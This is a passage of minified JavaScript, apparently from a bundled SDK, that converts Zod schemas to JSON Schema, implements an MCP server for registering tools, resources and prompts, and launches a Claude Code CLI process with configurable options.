Q.maxLength==="number"?Math.min(Q.maxLength,Y.value):Y.value,Y.message,J);break;case"email":switch(J.emailStrategy){case"format:email":$8(Q,"email",Y.message,J);break;case"format:idn-email":$8(Q,"idn-email",Y.message,J);break;case"pattern:zod":E9(Q,E8.email,Y.message,J);break}break;case"url":$8(Q,"uri",Y.message,J);break;case"uuid":$8(Q,"uuid",Y.message,J);break;case"regex":E9(Q,Y.regex,Y.message,J);break;case"cuid":E9(Q,E8.cuid,Y.message,J);break;case"cuid2":E9(Q,E8.cuid2,Y.message,J);break;case"startsWith":E9(Q,RegExp(`^${sz(Y.value,J)}`),Y.message,J);break;case"endsWith":E9(Q,RegExp(`${sz(Y.value,J)}$`),Y.message,J);break;case"datetime":$8(Q,"date-time",Y.message,J);break;case"date":$8(Q,"date",Y.message,J);break;case"time":$8(Q,"time",Y.message,J);break;case"duration":$8(Q,"duration",Y.message,J);break;case"length":_0(Q,"minLength",typeof Q.minLength==="number"?Math.max(Q.minLength,Y.value):Y.value,Y.message,J),_0(Q,"maxLength",typeof Q.maxLength==="number"?Math.min(Q.maxLength,Y.value):Y.value,Y.message,J);break;case"includes":{E9(Q,RegExp(sz(Y.value,J)),Y.message,J);break}case"ip":{if(Y.version!=="v6")$8(Q,"ipv4",Y.message,J);if(Y.version!=="v4")$8(Q,"ipv6",Y.message,J);break}case"base64url":E9(Q,E8.base64url,Y.message,J);break;case"jwt":E9(Q,E8.jwt,Y.message,J);break;case"cidr":{if(Y.version!=="v6")E9(Q,E8.ipv4Cidr,Y.message,J);if(Y.version!=="v4")E9(Q,E8.ipv6Cidr,Y.message,J);break}case"emoji":E9(Q,E8.emoji(),Y.message,J);break;case"ulid":{E9(Q,E8.ulid,Y.message,J);break}case"base64":{switch(J.base64Strategy){case"format:binary":{$8(Q,"binary",Y.message,J);break}case"contentEncoding:base64":{_0(Q,"contentEncoding","base64",Y.message,J);break}case"pattern:zod":{E9(Q,E8.base64,Y.message,J);break}}break}case"nanoid":E9(Q,E8.nanoid,Y.message,J);case"toLowerCase":case"toUpperCase":case"trim":break;default:((W)=>{})(Y)}return Q}function sz(X,J){return J.patternStrategy==="escape"?Jy1(X):X}function Jy1(X){let J="";for(let Q=0;Q<X.length;Q++){if(!Xy1.has(X[Q]))J+="\\";J+=X[Q]}return J}function $8(X,J,Q,Y){if(X.format||X.anyOf?.some((W)=>W.format)){if(!X.anyOf)X.anyOf=[];if(X.format){if(X.anyOf.push({format:X.format,...X.errorMessage&&Y.errorMessages&&{errorMessage:{format:X.errorMessage.format}}}),delete X.format,X.errorMessage){if(delete X.errorMessage.format,Object.keys(X.errorMessage).length===0)delete X.errorMessage}}X.anyOf.push({format:J,...Q&&Y.errorMessages&&{errorMessage:{format:Q}}})}else _0(X,"format",J,Q,Y)}function E9(X,J,Q,Y){if(X.pattern||X.allOf?.some((W)=>W.pattern)){if(!X.allOf)X.allOf=[];if(X.pattern){if(X.allOf.push({pattern:X.pattern,...X.errorMessage&&Y.errorMessages&&{errorMessage:{pattern:X.errorMessage.pattern}}}),delete X.pattern,X.errorMessage){if(delete X.errorMessage.pattern,Object.keys(X.errorMessage).length===0)delete X.errorMessage}}X.allOf.push({pattern:IN(J,Y),...Q&&Y.errorMessages&&{errorMessage:{pattern:Q}}})}else _0(X,"pattern",IN(J,Y),Q,Y)}function IN(X,J){if(!J.applyRegexFlags||!X.flags)return X.source;let Q={i:X.flags.includes("i"),m:X.flags.includes("m"),s:X.flags.includes("s")},Y=Q.i?X.source.toLowerCase():X.source,W="",z=!1,G=!1,H=!1;for(let U=0;U<Y.length;U++){if(z){W+=Y[U],z=!1;continue}if(Q.i){if(G){if(Y[U].match(/[a-z]/)){if(H)W+=Y[U],W+=`${Y[U-2]}-${Y[U]}`.toUpperCase(),H=!1;else if(Y[U+1]==="-"&&Y[U+2]?.match(/[a-z]/))W+=Y[U],H=!0;else W+=`${Y[U]}${Y[U].toUpperCase()}`;continue}}else if(Y[U].match(/[a-z]/)){W+=`[${Y[U]}${Y[U].toUpperCase()}]`;continue}}if(Q.m){if(Y[U]==="^"){W+=`(^|(?<=[\r
]))`;continue}else if(Y[U]==="$"){W+=`($|(?=[\r
]))`;continue}}if(Q.s&&Y[U]==="."){W+=G?`${Y[U]}\r
`:`[${Y[U]}\r
]`;continue}if(W+=Y[U],Y[U]==="\\")z=!0;else if(G&&Y[U]==="]")G=!1;else if(!G&&Y[U]==="[")G=!0}try{new RegExp(W)}catch{return console.warn(`Could not convert regex pattern at ${J.currentPath.join("/")} to a flag-independent form! Falling back to the flag-ignorant source`),X.source}return W}function NL(X,J){if(J.target==="openAi")console.warn("Warning: OpenAI may not support records in schemas! Try an array of key-value pairs instead.");if(J.target==="openApi3"&&X.keyType?._def.typeName===R1.ZodEnum)return{type:"object",required:X.keyType._def.values,properties:X.keyType._def.values.reduce((Y,W)=>({...Y,[W]:P0(X.valueType._def,{...J,currentPath:[...J.currentPath,"properties",W]})??{}}),{}),additionalProperties:J.rejectedAdditionalProperties};let Q={type:"object",additionalProperties:P0(X.valueType._def,{...J,currentPath:[...J.currentPath,"additionalProperties"]})??J.allowedAdditionalProperties};if(J.target==="openApi3")return Q;if(X.keyType?._def.typeName===R1.ZodString&&X.keyType._def.checks?.length){let{type:Y,...W}=AL(X.keyType._def,J);return{...Q,propertyNames:W}}else if(X.keyType?._def.typeName===R1.ZodEnum)return{...Q,propertyNames:{enum:X.keyType._def.values}};else if(X.keyType?._def.typeName===R1.ZodBranded&&X.keyType._def.type._def.typeName===R1.ZodString&&X.keyType._def.type._def.checks?.length){let{type:Y,...W}=OL(X.keyType._def,J);return{...Q,propertyNames:W}}return Q}function Qy1(X,J){if(J.mapStrategy==="record")return NL(X,J);let Q=P0(X.keyType._def,{...J,currentPath:[...J.currentPath,"items","items","0"]})||{},Y=P0(X.valueType._def,{...J,currentPath:[...J.currentPath,"items","items","1"]})||{};return{type:"array",maxItems:125,items:{type:"array",items:[Q,Y],minItems:2,maxItems:2}}}function Yy1(X){let J=X.values,Y=Object.keys(X.values).filter((z)=>{return typeof J[J[z]]!=="number"}).map((z)=>J[z]),W=Array.from(new Set(Y.map((z)=>typeof z)));return{type:W.length===1?W[0]==="string"?"string":"number":["string","number"],enum:Y}}function Wy1(){return{not:{}}}function Gy1(X){return X.target==="openApi3"?{enum:["null"],nullable:!0}:{type:"null"}}function zy1(X,J){if(J.target==="openApi3")return CN(X,J);let Q=X.options instanceof Map?Array.from(X.options.values()):X.options;if(Q.every((Y)=>(Y._def.typeName in M2)&&(!Y._def.checks||!Y._def.checks.length))){let Y=Q.reduce((W,z)=>{let G=M2[z._def.typeName];return G&&!W.includes(G)?[...W,G]:W},[]);return{type:Y.length>1?Y:Y[0]}}else if(Q.every((Y)=>Y._def.typeName==="ZodLiteral"&&!Y.description)){let Y=Q.reduce((W,z)=>{let G=typeof z._def.value;switch(G){case"string":case"number":case"boolean":return[...W,G];case"bigint":return[...W,"integer"];case"object":if(z._def.value===null)return[...W,"null"];case"symbol":case"undefined":case"function":default:return W}},[]);if(Y.length===Q.length){let W=Y.filter((z,G,H)=>H.indexOf(z)===G);return{type:W.length>1?W:W[0],enum:Q.reduce((z,G)=>{return z.includes(G._def.value)?z:[...z,G._def.value]},[])}}}else if(Q.every((Y)=>Y._def.typeName==="ZodEnum"))return{type:"string",enum:Q.reduce((Y,W)=>[...Y,...W._def.values.filter((z)=>!Y.includes(z))],[])};return CN(X,J)}function Hy1(X,J){if(["ZodString","ZodNumber","ZodBigInt","ZodBoolean","ZodNull"].includes(X.innerType._def.typeName)&&(!X.innerType._def.checks||!X.innerType._def.checks.length)){if(J.target==="openApi3")return{type:M2[X.innerType._def.typeName],nullable:!0};return{type:[M2[X.innerType._def.typeName],"null"]}}if(J.target==="openApi3"){let Y=P0(X.innerType._def,{...J,currentPath:[...J.currentPath]});if(Y&&"$ref"in Y)return{allOf:[Y],nullable:!0};return Y&&{...Y,nullable:!0}}let Q=P0(X.innerType._def,{...J,currentPath:[...J.currentPath,"anyOf","0"]});return Q&&{anyOf:[Q,{type:"null"}]}}function Uy1(X,J){let Q={type:"number"};if(!X.checks)return Q;for(let Y of X.checks)switch(Y.kind){case"int":Q.type="integer",jL(Q,"type",Y.message,J);break;case"min":if(J.target==="jsonSchema7")if(Y.inclusive)_0(Q,"minimum",Y.value,Y.message,J);else _0(Q,"exclusiveMinimum",Y.value,Y.message,J);else{if(!Y.inclusive)Q.exclusiveMinimum=!0;_0(Q,"minimum",Y.value,Y.message,J)}break;case"max":if(J.target==="jsonSchema7")if(Y.inclusive)_0(Q,"maximum",Y.value,Y.message,J);else _0(Q,"exclusiveMaximum",Y.value,Y.message,J);else{if(!Y.inclusive)Q.exclusiveMaximum=!0;_0(Q,"maximum",Y.value,Y.message,J)}break;case"multipleOf":_0(Q,"multipleOf",Y.value,Y.message,J);break}return Q}function Ky1(X,J){let Q=J.target==="openAi",Y={type:"object",properties:{}},W=[],z=X.shape();for(let H in z){let U=z[H];if(U===void 0||U._def===void 0)continue;let K=By1(U);if(K&&Q){if(U instanceof U8)U=U._def.innerType;if(!U.isNullable())U=U.nullable();K=!1}let V=P0(U._def,{...J,currentPath:[...J.currentPath,"properties",H],propertyPath:[...J.currentPath,"properties",H]});if(V===void 0)continue;if(Y.properties[H]=V,!K)W.push(H)}if(W.length)Y.required=W;let G=Vy1(X,J);if(G!==void 0)Y.additionalProperties=G;return Y}function Vy1(X,J){if(X.catchall._def.typeName!=="ZodNever")return P0(X.catchall._def,{...J,currentPath:[...J.currentPath,"additionalProperties"]});switch(X.unknownKeys){case"passthrough":return J.allowedAdditionalProperties;case"strict":return J.rejectedAdditionalProperties;case"strip":return J.removeAdditionalStrategy==="strict"?J.allowedAdditionalProperties:J.rejectedAdditionalProperties}}function By1(X){try{return X.isOptional()}catch{return!0}}function My1(X,J){return P0(X.type._def,J)}function Fy1(X,J){let Y={type:"array",uniqueItems:!0,items:P0(X.valueType._def,{...J,currentPath:[...J.currentPath,"items"]})};if(X.minSize)_0(Y,"minItems",X.minSize.value,X.minSize.message,J);if(X.maxSize)_0(Y,"maxItems",X.maxSize.value,X.maxSize.message,J);return Y}function jy1(X,J){if(X.rest)return{type:"array",minItems:X.items.length,items:X.items.map((Q,Y)=>P0(Q._def,{...J,currentPath:[...J.currentPath,"items",`${Y}`]})).reduce((Q,Y)=>Y===void 0?Q:[...Q,Y],[]),additionalItems:P0(X.rest._def,{...J,currentPath:[...J.currentPath,"additionalItems"]})};else return{type:"array",minItems:X.items.length,maxItems:X.items.length,items:X.items.map((Q,Y)=>P0(Q._def,{...J,currentPath:[...J.currentPath,"items",`${Y}`]})).reduce((Q,Y)=>Y===void 0?Q:[...Q,Y],[])}}function Oy1(){return{not:{}}}function Ry1(){return{}}function P0(X,J,Q=!1){let Y=J.seen.get(X);if(J.override){let H=J.override?.(X,J,Y,Q);if(H!==yh1)return H}if(Y&&!Q){let H=Ly1(Y,J);if(H!==void 0)return H}let W={def:X,path:J.currentPath,jsonSchema:void 0};J.seen.set(X,W);let z=Ny1(X,X.typeName,J),G=typeof z==="function"?P0(z(),J):z;if(G)wy1(X,J,G);if(J.postProcess){let H=J.postProcess(G,X,J);return W.jsonSchema=G,H}return W.jsonSchema=G,G}function Iy1(X){if(!X)return{};let{errorMap:J,invalid_type_error:Q,required_error:Y,description:W}=X;if(J&&(Q||Y))throw new Error(`Can't use "invalid_type_error" or "required_error" in conjunction with custom error map.`);if(J)return{errorMap:J,description:W};return{errorMap:(G,H)=>{var U,K;let{message:V}=X;if(G.code==="invalid_enum_value")return{message:V!==null&&V!==void 0?V:H.defaultError};if(typeof H.data==="undefined")return{message:(U=V!==null&&V!==void 0?V:Y)!==null&&U!==void 0?U:H.defaultError};if(G.code!=="invalid_type")return{message:H.defaultError};return{message:(K=V!==null&&V!==void 0?V:Q)!==null&&K!==void 0?K:H.defaultError}},description:W}}class LL{constructor(X,J){this._registeredResources={},this._registeredResourceTemplates={},this._registeredTools={},this._registeredPrompts={},this._toolHandlersInitialized=!1,this._completionHandlerInitialized=!1,this._resourceHandlersInitialized=!1,this._promptHandlersInitialized=!1,this.server=new FL(X,J)}async connect(X){return await this.server.connect(X)}async close(){await this.server.close()}setToolRequestHandlers(){if(this._toolHandlersInitialized)return;this.server.assertCanSetRequestHandler(HH.shape.method.value),this.server.assertCanSetRequestHandler(UH.shape.method.value),this.server.registerCapabilities({tools:{listChanged:!0}}),this.server.setRequestHandler(HH,()=>({tools:Object.entries(this._registeredTools).filter(([,X])=>X.enabled).map(([X,J])=>{let Q={name:X,title:J.title,description:J.description,inputSchema:J.inputSchema?PN(J.inputSchema,{strictUnions:!0}):Cy1,annotations:J.annotations};if(J.outputSchema)Q.outputSchema=PN(J.outputSchema,{strictUnions:!0});return Q})})),this.server.setRequestHandler(UH,async(X,J)=>{let Q=this._registeredTools[X.params.name];if(!Q)throw new n0(l0.InvalidParams,`Tool ${X.params.name} not found`);if(!Q.enabled)throw new n0(l0.InvalidParams,`Tool ${X.params.name} disabled`);let Y;if(Q.inputSchema){let W=await Q.inputSchema.safeParseAsync(X.params.arguments);if(!W.success)throw new n0(l0.InvalidParams,`Invalid arguments for tool ${X.params.name}: ${W.error.message}`);let z=W.data,G=Q.callback;try{Y=await Promise.resolve(G(z,J))}catch(H){Y={content:[{type:"text",text:H instanceof Error?H.message:String(H)}],isError:!0}}}else{let W=Q.callback;try{Y=await Promise.resolve(W(J))}catch(z){Y={content:[{type:"text",text:z instanceof Error?z.message:String(z)}],isError:!0}}}if(Q.outputSchema&&!Y.isError){if(!Y.structuredContent)throw new n0(l0.InvalidParams,`Tool ${X.params.name} has an output schema but no structured content was provided`);let W=await Q.outputSchema.safeParseAsync(Y.structuredContent);if(!W.success)throw new n0(l0.InvalidParams,`Invalid structured content for tool ${X.params.name}: ${W.error.message}`)}return Y}),this._toolHandlersInitialized=!0}setCompletionRequestHandler(){if(this._completionHandlerInitialized)return;this.server.assertCanSetRequestHandler(KH.shape.method.value),this.server.registerCapabilities({completions:{}}),this.server.setRequestHandler(KH,async(X)=>{switch(X.params.ref.type){case"ref/prompt":return this.handlePromptCompletion(X,X.params.ref);case"ref/resource":return this.handleResourceCompletion(X,X.params.ref);default:throw new n0(l0.InvalidParams,`Invalid completion reference: ${X.params.ref}`)}}),this._completionHandlerInitialized=!0}async handlePromptCompletion(X,J){let Q=this._registeredPrompts[J.name];if(!Q)throw new n0(l0.InvalidParams,`Prompt ${J.name} not found`);if(!Q.enabled)throw new n0(l0.InvalidParams,`Prompt ${J.name} disabled`);if(!Q.argsSchema)return B2;let Y=Q.argsSchema.shape[X.params.argument.name];if(!(Y instanceof F2))return B2;let z=await Y._def.complete(X.params.argument.value,X.params.context);return TN(z)}async handleResourceCompletion(X,J){let Q=Object.values(this._registeredResourceTemplates).find((z)=>z.resourceTemplate.uriTemplate.toString()===J.uri);if(!Q){if(this._registeredResources[J.uri])return B2;throw new n0(l0.InvalidParams,`Resource template ${X.params.ref.uri} not found`)}let Y=Q.resourceTemplate.completeCallback(X.params.argument.name);if(!Y)return B2;let W=await Y(X.params.argument.value,X.params.context);return TN(W)}setResourceRequestHandlers(){if(this._resourceHandlersInitialized)return;this.server.assertCanSetRequestHandler(QH.shape.method.value),this.server.assertCanSetRequestHandler(YH.shape.method.value),this.server.assertCanSetRequestHandler(WH.shape.method.value),this.server.registerCapabilities({resources:{listChanged:!0}}),this.server.setRequestHandler(QH,async(X,J)=>{let Q=Object.entries(this._registeredResources).filter(([W,z])=>z.enabled).map(([W,z])=>({uri:W,name:z.name,...z.metadata})),Y=[];for(let W of Object.values(this._registeredResourceTemplates)){if(!W.resourceTemplate.listCallback)continue;let z=await W.resourceTemplate.listCallback(J);for(let G of z.resources)Y.push({...W.metadata,...G})}return{resources:[...Q,...Y]}}),this.server.setRequestHandler(YH,async()=>{return{resourceTemplates:Object.entries(this._registeredResourceTemplates).map(([J,Q])=>({name:J,uriTemplate:Q.resourceTemplate.uriTemplate.toString(),...Q.metadata}))}}),this.server.setRequestHandler(WH,async(X,J)=>{let Q=new URL(X.params.uri),Y=this._registeredResources[Q.toString()];if(Y){if(!Y.enabled)throw new n0(l0.InvalidParams,`Resource ${Q} disabled`);return Y.readCallback(Q,J)}for(let W of Object.values(this._registeredResourceTemplates)){let z=W.resourceTemplate.uriTemplate.match(Q.toString());if(z)return W.readCallback(Q,z,J)}throw new n0(l0.InvalidParams,`Resource ${Q} not found`)}),this.setCompletionRequestHandler(),this._resourceHandlersInitialized=!0}setPromptRequestHandlers(){if(this._promptHandlersInitialized)return;this.server.assertCanSetRequestHandler(GH.shape.method.value),this.server.assertCanSetRequestHandler(zH.shape.method.value),this.server.registerCapabilities({prompts:{listChanged:!0}}),this.server.setRequestHandler(GH,()=>({prompts:Object.entries(this._registeredPrompts).filter(([,X])=>X.enabled).map(([X,J])=>{return{name:X,title:J.title,description:J.description,arguments:J.argsSchema?Sy1(J.argsSchema):void 0}})})),this.server.setRequestHandler(zH,async(X,J)=>{let Q=this._registeredPrompts[X.params.name];if(!Q)throw new n0(l0.InvalidParams,`Prompt ${X.params.name} not found`);if(!Q.enabled)throw new n0(l0.InvalidParams,`Prompt ${X.params.name} disabled`);if(Q.argsSchema){let Y=await Q.argsSchema.safeParseAsync(X.params.arguments);if(!Y.success)throw new n0(l0.InvalidParams,`Invalid arguments for prompt ${X.params.name}: ${Y.error.message}`);let W=Y.data,z=Q.callback;return await Promise.resolve(z(W,J))}else{let Y=Q.callback;return await Promise.resolve(Y(J))}}),this.setCompletionRequestHandler(),this._promptHandlersInitialized=!0}resource(X,J,...Q){let Y;if(typeof Q[0]==="object")Y=Q.shift();let W=Q[0];if(typeof J==="string"){if(this._registeredResources[J])throw new Error(`Resource ${J} is already registered`);let z=this._createRegisteredResource(X,void 0,J,Y,W);return this.setResourceRequestHandlers(),this.sendResourceListChanged(),z}else{if(this._registeredResourceTemplates[X])throw new Error(`Resource template ${X} is already registered`);let z=this._createRegisteredResourceTemplate(X,void 0,J,Y,W);return this.setResourceRequestHandlers(),this.sendResourceListChanged(),z}}registerResource(X,J,Q,Y){if(typeof J==="string"){if(this._registeredResources[J])throw new Error(`Resource ${J} is already registered`);let W=this._createRegisteredResource(X,Q.title,J,Q,Y);return this.setResourceRequestHandlers(),this.sendResourceListChanged(),W}else{if(this._registeredResourceTemplates[X])throw new Error(`Resource template ${X} is already registered`);let W=this._createRegisteredResourceTemplate(X,Q.title,J,Q,Y);return this.setResourceRequestHandlers(),this.sendResourceListChanged(),W}}_createRegisteredResource(X,J,Q,Y,W){let z={name:X,title:J,metadata:Y,readCallback:W,enabled:!0,disable:()=>z.update({enabled:!1}),enable:()=>z.update({enabled:!0}),remove:()=>z.update({uri:null}),update:(G)=>{if(typeof G.uri!=="undefined"&&G.uri!==Q){if(delete this._registeredResources[Q],G.uri)this._registeredResources[G.uri]=z}if(typeof G.name!=="undefined")z.name=G.name;if(typeof G.title!=="undefined")z.title=G.title;if(typeof G.metadata!=="undefined")z.metadata=G.metadata;if(typeof G.callback!=="undefined")z.readCallback=G.callback;if(typeof G.enabled!=="undefined")z.enabled=G.enabled;this.sendResourceListChanged()}};return this._registeredResources[Q]=z,z}_createRegisteredResourceTemplate(X,J,Q,Y,W){let z={resourceTemplate:Q,title:J,metadata:Y,readCallback:W,enabled:!0,disable:()=>z.update({enabled:!1}),enable:()=>z.update({enabled:!0}),remove:()=>z.update({name:null}),update:(G)=>{if(typeof G.name!=="undefined"&&G.name!==X){if(delete this._registeredResourceTemplates[X],G.name)this._registeredResourceTemplates[G.name]=z}if(typeof G.title!=="undefined")z.title=G.title;if(typeof G.template!=="undefined")z.resourceTemplate=G.template;if(typeof G.metadata!=="undefined")z.metadata=G.metadata;if(typeof G.callback!=="undefined")z.readCallback=G.callback;if(typeof G.enabled!=="undefined")z.enabled=G.enabled;this.sendResourceListChanged()}};return this._registeredResourceTemplates[X]=z,z}_createRegisteredPrompt(X,J,Q,Y,W){let z={title:J,description:Q,argsSchema:Y===void 0?void 0:L.object(Y),callback:W,enabled:!0,disable:()=>z.update({enabled:!1}),enable:()=>z.update({enabled:!0}),remove:()=>z.update({name:null}),update:(G)=>{if(typeof G.name!=="undefined"&&G.name!==X){if(delete this._registeredPrompts[X],G.name)this._registeredPrompts[G.name]=z}if(typeof G.title!=="undefined")z.title=G.title;if(typeof G.description!=="undefined")z.description=G.description;if(typeof G.argsSchema!=="undefined")z.argsSchema=L.object(G.argsSchema);if(typeof G.callback!=="undefined")z.callback=G.callback;if(typeof G.enabled!=="undefined")z.enabled=G.enabled;this.sendPromptListChanged()}};return this._registeredPrompts[X]=z,z}_createRegisteredTool(X,J,Q,Y,W,z,G){let H={title:J,description:Q,inputSchema:Y===void 0?void 0:L.object(Y),outputSchema:W===void 0?void 0:L.object(W),annotations:z,callback:G,enabled:!0,disable:()=>H.update({enabled:!1}),enable:()=>H.update({enabled:!0}),remove:()=>H.update({name:null}),update:(U)=>{if(typeof U.name!=="undefined"&&U.name!==X){if(delete this._registeredTools[X],U.name)this._registeredTools[U.name]=H}if(typeof U.title!=="undefined")H.title=U.title;if(typeof U.description!=="undefined")H.description=U.description;if(typeof U.paramsSchema!=="undefined")H.inputSchema=L.object(U.paramsSchema);if(typeof U.callback!=="undefined")H.callback=U.callback;if(typeof U.annotations!=="undefined")H.annotations=U.annotations;if(typeof U.enabled!=="undefined")H.enabled=U.enabled;this.sendToolListChanged()}};return this._registeredTools[X]=H,this.setToolRequestHandlers(),this.sendToolListChanged(),H}tool(X,...J){if(this._registeredTools[X])throw new Error(`Tool ${X} is already registered`);let Q,Y,W,z;if(typeof J[0]==="string")Q=J.shift();if(J.length>1){let H=J[0];if(SN(H)){if(Y=J.shift(),J.length>1&&typeof J[0]==="object"&&J[0]!==null&&!SN(J[0]))z=J.shift()}else if(typeof H==="object"&&H!==null)z=J.shift()}let G=J[0];return this._createRegisteredTool(X,void 0,Q,Y,W,z,G)}registerTool(X,J,Q){if(this._registeredTools[X])throw new Error(`Tool ${X} is already registered`);let{title:Y,description:W,inputSchema:z,outputSchema:G,annotations:H}=J;return this._createRegisteredTool(X,Y,W,z,G,H,Q)}prompt(X,...J){if(this._registeredPrompts[X])throw new Error(`Prompt ${X} is already registered`);let Q;if(typeof J[0]==="string")Q=J.shift();let Y;if(J.length>1)Y=J.shift();let W=J[0],z=this._createRegisteredPrompt(X,void 0,Q,Y,W);return this.setPromptRequestHandlers(),this.sendPromptListChanged(),z}registerPrompt(X,J,Q){if(this._registeredPrompts[X])throw new Error(`Prompt ${X} is already registered`);let{title:Y,description:W,argsSchema:z}=J,G=this._createRegisteredPrompt(X,Y,W,z,Q);return this.setPromptRequestHandlers(),this.sendPromptListChanged(),G}isConnected(){return this.server.transport!==void 0}sendResourceListChanged(){if(this.isConnected())this.server.sendResourceListChanged()}sendToolListChanged(){if(this.isConnected())this.server.sendToolListChanged()}sendPromptListChanged(){if(this.isConnected())this.server.sendPromptListChanged()}}function SN(X){if(typeof X!=="object"||X===null)return!1;return Object.keys(X).length===0||Object.values(X).some(Py1)}function Py1(X){return X!==null&&typeof X==="object"&&"parse"in X&&typeof X.parse==="function"&&"safeParse"in X&&typeof X.safeParse==="function"}function Sy1(X){return Object.entries(X.shape).map(([J,Q])=>({name:J,description:Q.description,required:!Q.isOptional()}))}function TN(X){return{completion:{values:X.slice(0,100),total:X.length,hasMore:X.length>100}}}function Ty1(X,J,Q,Y){return{name:X,description:J,inputSchema:Q,handler:Y}}function _y1(X){let J=new LL({name:X.name,version:X.version??"1.0.0"},{capabilities:{tools:X.tools?{}:void 0}});if(X.tools)X.tools.forEach((Q)=>{J.tool(Q.name,Q.description,Q.inputSchema,Q.handler)});return{type:"sdk",name:X.name,instance:J}}function DH({prompt:X,options:{abortController:J=bN(),additionalDirectories:Q=[],allowedTools:Y=[],appendSystemPrompt:W,canUseTool:z,continue:G,customSystemPrompt:H,cwd:U,disallowedTools:K=[],env:V,executable:B=vN()?"bun":"node",executableArgs:Z=[],extraArgs:M={},fallbackModel:F,hooks:j,includePartialMessages:O,maxTurns:N,mcpServers:A,model:D,pathToClaudeCodeExecutable:S,permissionMode:$="default",permissionPromptToolName:T,resume:k,stderr:E,strictMcpConfig:y}={}}){if(!V)V={...process.env};if(!V.CLAUDE_CODE_ENTRYPOINT)V.CLAUDE_CODE_ENTRYPOINT="sdk-ts";if(S===void 0){let J1=Cf1(import.meta.url),H1=ON(J1,"..");S=ON(H1,"cli.js")}let a={},p=new Map;if(A)for(let[J1,H1]of Object.entries(A))if(H1.type==="sdk")p.set(J1,H1.instance),a[J1]={type:"sdk",name:J1};else a[J1]=H1;let f=typeof X!=="string",m=new xN({prompt:X,abortController:J,additionalDirectories:Q,cwd:U,executable:B,executableArgs:Z,extraArgs:M,pathToClaudeCodeExecutable:S,env:V,stderr:E,customSystemPrompt:H,appendSystemPrompt:W,maxTurns:N,model:D,fallbackModel:F,permissionMode:$,permissionPromptToolName:T,continueConversation:G,resume:k,allowedTools:Y,disallowedTools:K,mcpServers:A,strictMcpConfig:y,canUseTool:!!z,hooks:!!j,includePartialMessages:O}),o=new hN(m,f,z,j,J,p);if(typeof X!=="string")o.streamInput(X);return o}var yx1,mx1,oz,ux1,cx1,lx1=(X,J,Q)=>{Q=X!=null?yx1(mx1(X)):{};let Y=J||!X||!X.__esModule?oz(Q,"default",{value:X,enumerable:!0}):Q;for(let W of ux1(X))if(!cx1.call(Y,W))oz(Y,W,{get:()=>X[W],enumerable:!0});return Y},Y0=(X,J)=>()=>(J||X((J={exports:{}}).exports,J),J.exports),px1=(X,J)=>{for(var Q in J)oz(X,Q,{get:J[Q],enumerable:!0,configurable:!0,set:(Y)=>J[Q]=()=>Y})},dx1,BH,ix1,w7,_N,rx1,qH,ZH,EN,$N,nx1,ax1,sx1,ox1,tx1,ex1,Xf1,Jf1,Qf1,Yf1,Wf1,Gf1,zf1,Hf1,ZN,MN,FN,jN,Uf1,Kf1,Vf1,Bf1,qf1,Zf1,Mf1,Ff1,jf1,Of1,Rf1,Af1,Nf1,kN,Lf1,Df1,wf1,If1,Sf1=50,$f1,kf1,U7,fN,hN,L,N0,tz,T1,T6=(X)=>{switch(typeof X){case"undefined":return T1.undefined;case"string":return T1.string;case"number":return Number.isNaN(X)?T1.nan:T1.number;case"boolean":return T1.boolean;case"function":return T1.function;case"bigint":return T1.bigint;case"symbol":return T1.symbol;case"object":if(Array.isArray(X))return T1.array;if(X===null)return T1.null;if(X.then&&typeof X.then==="function"&&X.catch&&typeof X.catch==="function")return T1.promise;if(typeof Map!=="undefined"&&X instanceof Map)return T1.map;if(typeof Set!=="undefined"&&X instanceof Set)return T1.set;if(typeof Date!=="undefined"&&X instanceof Date)return T1.date;return T1.object;default:return T1.unknown}},F1,vf1=(X)=>{return JSON.stringify(X,null,2).replace(/"([^"]+)":/g,"$1:")},s9,xf1=(X,J)=>{let Q;switch(X.code){case F1.invalid_type:if(X.received===T1.undefined)Q="Required";else Q=`Expected ${X.expected}, received ${X.received}`;break;case F1.invalid_literal:Q=`Invalid literal value, expected ${JSON.stringify(X.expected,N0.jsonStringifyReplacer)}`;break;case F1.unrecognized_keys:Q=`Unrecognized key(s) in object: ${N0.joinValues(X.keys,", ")}`;break;case F1.invalid_union:Q="Invalid input";break;case F1.invalid_union_discriminator:Q=`Invalid discriminator value. Expected ${N0.joinValues(X.options)}`;break;case F1.invalid_enum_value:Q=`Invalid enum value. Expected ${N0.joinValues(X.options)}, received '${X.received}'`;break;case F1.invalid_arguments:Q="Invalid function arguments";break;case F1.invalid_return_type:Q="Invalid function return type";break;case F1.invalid_date:Q="Invalid date";break;case F1.invalid_string:if(typeof X.validation==="object")if("includes"in X.validation){if(Q=`Invalid input: must include "${X.validation.includes}"`,typeof X.validation.position==="number")Q=`${Q} at one or more positions greater than or equal to ${X.validation.position}`}else if("startsWith"in X.validation)Q=`Invalid input: must start with "${X.validation.startsWith}"`;else if("endsWith"in X.validation)Q=`Invalid input: must end with "${X.validation.endsWith}"`;else N0.assertNever(X.validation);else if(X.validation!=="regex")Q=`Invalid ${X.validation}`;else Q="Invalid";break;case F1.too_small:if(X.type==="array")Q=`Array must contain ${X.exact?"exactly":X.inclusive?"at least":"more than"} ${X.minimum} element(s)`;else if(X.type==="string")Q=`String must contain ${X.exact?"exactly":X.inclusive?"at least":"over"} ${X.minimum} character(s)`;else if(X.type==="number")Q=`Number must be ${X.exact?"exactly equal to ":X.inclusive?"greater than or equal to ":"greater than "}${X.minimum}`;else if(X.type==="bigint")Q=`Number must be ${X.exact?"exactly equal to ":X.inclusive?"greater than or equal to ":"greater than "}${X.minimum}`;else if(X.type==="date")Q=`Date must be ${X.exact?"exactly equal to ":X.inclusive?"greater than or equal to ":"greater than "}${new Date(Number(X.minimum))}`;else Q="Invalid input";break;case F1.too_big:if(X.type==="array")Q=`Array must contain ${X.exact?"exactly":X.inclusive?"at most":"less than"} ${X.maximum} element(s)`;else if(X.type==="string")Q=`String must contain ${X.exact?"exactly":X.inclusive?"at most":"under"} ${X.maximum} character(s)`;else if(X.type==="number")Q=`Number must be ${X.exact?"exactly":X.inclusive?"less than or equal to":"less than"} ${X.maximum}`;else if(X.type==="bigint")Q=`BigInt must be ${X.exact?"exactly":X.inclusive?"less than or equal to":"less than"} ${X.maximum}`;else if(X.type==="date")Q=`Date must be ${X.exact?"exactly":X.inclusive?"smaller than or equal to":"smaller than"} ${new Date(Number(X.maximum))}`;else Q="Invalid input";break;case F1.custom:Q="Invalid input";break;case F1.invalid_intersection_types:Q="Intersection results could not be merged";break;case F1.not_multiple_of:Q=`Number must be a multiple of ${X.multipleOf}`;break;case F1.not_finite:Q="Number 